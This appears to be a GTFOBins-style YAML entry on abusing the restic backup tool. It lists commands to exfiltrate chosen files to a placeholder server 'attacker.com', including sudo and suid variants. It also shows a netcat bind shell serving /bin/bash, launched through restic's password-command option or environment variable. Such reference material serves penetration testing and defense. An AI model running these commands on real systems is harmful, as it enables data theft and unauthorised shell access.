---
description: |
  The attacker must setup a server to receive the backups, in the following example [rest-server](https://github.com/restic/rest-server/) is used but there are other options. To start a new instance and create a new repository:

  ```console
  RPORT=12345
  NAME=backup_name
  ./rest-server --listen ":$RPORT"
  restic init -r "rest:http://localhost:$RPORT/$NAME"
  ```

  To extract the data from the restic repository in the current directory on the attacker side:

  ```console
  restic restore -r "/tmp/restic/$NAME" latest --target .
  ```

  Upload data to the attacker server with the following commands.
functions:
  command:
    - description: The attacker does not need to setup a server to receive the backups in this case. Command execution can be achieved through control of argv or environment, many restic subcommands support this option, so even if the attacker control only a subset of argv, command execution may still be achievable.
      code: |
        RESTIC_PASSWORD_COMMAND='nc -l 127.0.0.1 -p 4321 -e /bin/bash' restic backup # Through environment
        restic backup --password-command="nc -l 127.0.0.1 -p 4321 -e /bin/bash"      # Through option
  file-upload:
    - code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_or_dir_to_get
        NAME=backup_name
        restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
  sudo:
    - code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_or_dir_to_get
        NAME=backup_name
        sudo restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
  suid:
    - code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_or_dir_to_get
        NAME=backup_name
        ./restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
---
